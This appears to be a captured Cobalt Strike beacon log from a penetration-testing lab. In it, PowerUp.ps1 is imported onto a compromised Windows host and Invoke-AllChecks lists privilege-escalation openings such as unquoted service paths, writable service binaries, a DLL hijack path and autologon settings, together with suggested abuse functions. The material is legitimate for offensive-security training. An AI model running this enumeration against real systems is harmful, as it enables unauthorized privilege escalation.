`powershell-import /root/offshore/ms01/PowerUp.ps1`
```bash
[10/20 18:22:00] beacon> powershell-import /root/offshore/ms01/PowerUp.ps1
[10/20 18:22:21] [*] Tasked beacon to import: /root/offshore/ms01/PowerUp.ps1
[10/20 18:22:22] [+] host called home, sent: 284097 bytes
```
`powershell Invoke-AllChecks`
```bash
[10/20 18:30:04] beacon> powershell Invoke-AllChecks
[10/20 18:30:04] [*] Tasked beacon to run: Invoke-AllChecks
[10/20 18:30:04] [+] host called home, sent: 313 bytes
[10/20 18:30:14] [+] received output:
#< CLIXML





ServiceName    : WCAssistantService

Path           : C:\Program Files (x86)\Lavasoft\Web 

                 Companion\Application\Lavasoft.WCAssistant.WinService.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; 

                 Permissions=AppendData/AddSubdirectory}

StartName      : LocalSystem

AbuseFunction  : Write-ServiceBinary -Name 'WCAssistantService' -Path <HijackPath>

CanRestart     : True

Name           : WCAssistantService

Check          : Unquoted Service Paths



ServiceName    : WCAssistantService

Path           : C:\Program Files (x86)\Lavasoft\Web 

                 Companion\Application\Lavasoft.WCAssistant.WinService.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; 

                 Permissions=System.Object[]}

StartName      : LocalSystem

AbuseFunction  : Write-ServiceBinary -Name 'WCAssistantService' -Path <HijackPath>

CanRestart     : True

Name           : WCAssistantService

Check          : Unquoted Service Paths



ServiceName    : WCAssistantService

Path           : C:\Program Files (x86)\Lavasoft\Web 

                 Companion\Application\Lavasoft.WCAssistant.WinService.exe

ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Lavasoft\Web 

                 Companion\Application\Lavasoft.WCAssistant.WinService.exe; 

                 IdentityReference=CORP\Domain Users; Permissions=System.Object[]}

StartName      : LocalSystem

AbuseFunction  : Write-ServiceBinary -Name 'WCAssistantService' -Path <HijackPath>

CanRestart     : True

Name           : WCAssistantService

Check          : Unquoted Service Paths



ServiceName    : wnnufqyv

Path           : C:\Program Files\service.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; 

                 Permissions=AppendData/AddSubdirectory}

StartName      : LocalSystem

AbuseFunction  : Write-ServiceBinary -Name 'wnnufqyv' -Path <HijackPath>

CanRestart     : False

Name           : wnnufqyv

Check          : Unquoted Service Paths



ServiceName    : wnnufqyv

Path           : C:\Program Files\service.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; 

                 Permissions=System.Object[]}

StartName      : LocalSystem

AbuseFunction  : Write-ServiceBinary -Name 'wnnufqyv' -Path <HijackPath>

CanRestart     : False

Name           : wnnufqyv

Check          : Unquoted Service Paths




[10/20 18:30:18] [+] received output:
ServiceName                     : kxyqdzar

Path                            : C:\Users\ned.flanders_adm\Desktop\i2smsxgw.bze.exe

ModifiableFile                  : C:\Users\ned.flanders_adm\Desktop

ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

ModifiableFileIdentityReference : CORP\ned.flanders_adm

StartName                       : LocalSystem

AbuseFunction                   : Install-ServiceBinary -Name 'kxyqdzar'

CanRestart                      : False

Name                            : kxyqdzar

Check                           : Modifiable Service Files



ServiceName                     : PowerUpService

Path                            : C:\Users\ned.flanders_adm\Desktop\powerup.exe

ModifiableFile                  : C:\Users\ned.flanders_adm\Desktop

ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

ModifiableFileIdentityReference : CORP\ned.flanders_adm

StartName                       : LocalSystem

AbuseFunction                   : Install-ServiceBinary -Name 'PowerUpService'

CanRestart                      : False

Name                            : PowerUpService

Check                           : Modifiable Service Files



ServiceName                     : WCAssistantService

Path                            : C:\Program Files (x86)\Lavasoft\Web 

                                  Companion\Application\Lavasoft.WCAssistant.WinService.exe

ModifiableFile                  : C:\Program Files (x86)\Lavasoft\Web 

                                  Companion\Application\Lavasoft.WCAssistant.WinService.exe

ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

ModifiableFileIdentityReference : CORP\Domain Users

StartName                       : LocalSystem

AbuseFunction                   : Install-ServiceBinary -Name 'WCAssistantService'

CanRestart                      : True

Name                            : WCAssistantService

Check                           : Modifiable Service Files



ServiceName                     : xciofdrd

Path                            : C:\Users\ned.flanders_adm\Desktop\mxldu5em.fon.exe

ModifiableFile                  : C:\Users\ned.flanders_adm\Desktop

ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

ModifiableFileIdentityReference : CORP\ned.flanders_adm

StartName                       : LocalSystem

AbuseFunction                   : Install-ServiceBinary -Name 'xciofdrd'

CanRestart                      : False

Name                            : xciofdrd

Check                           : Modifiable Service Files




[10/20 18:30:20] [+] received output:
ModifiablePath    : C:\Users\ned.flanders_adm\AppData\Local\Microsoft\WindowsApps

IdentityReference : CORP\ned.flanders_adm

Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

%PATH%            : C:\Users\ned.flanders_adm\AppData\Local\Microsoft\WindowsApps

Name              : C:\Users\ned.flanders_adm\AppData\Local\Microsoft\WindowsApps

Check             : %PATH% .dll Hijacks

AbuseFunction     : Write-HijackDll -DllPath 

                    'C:\Users\ned.flanders_adm\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'



DefaultDomainName    : CORP

DefaultUserName      : wsadmin

DefaultPassword      : 

AltDefaultDomainName : 

AltDefaultUserName   : 

AltDefaultPassword   : 

Check                : Registry Autologons



Key            : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\PowerUp

Path           : vuln.exe -i 'C:\Users\ned.flanders_adm\Desktop\4ko12amv.evb'

ModifiableFile : @{ModifiablePath=C:\Users\ned.flanders_adm\Desktop; 

                 IdentityReference=CORP\ned.flanders_adm; Permissions=System.Object[]}

Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\PowerUp

Check          : Modifiable Registry Autorun




[10/20 18:30:22] [+] received output:
Changed   : [BLANK]

UserNames : [BLANK]

NewName   : [BLANK]

Passwords : [BLANK]

File      : C:\ProgramData\Microsoft\Group Policy\History\{73CF7CDB-C616-45C4-B766-D4A3B39ACB80}\M

            achine\Preferences\Services\Services.xml

Check     : Cached GPP Files







<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">3</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>

```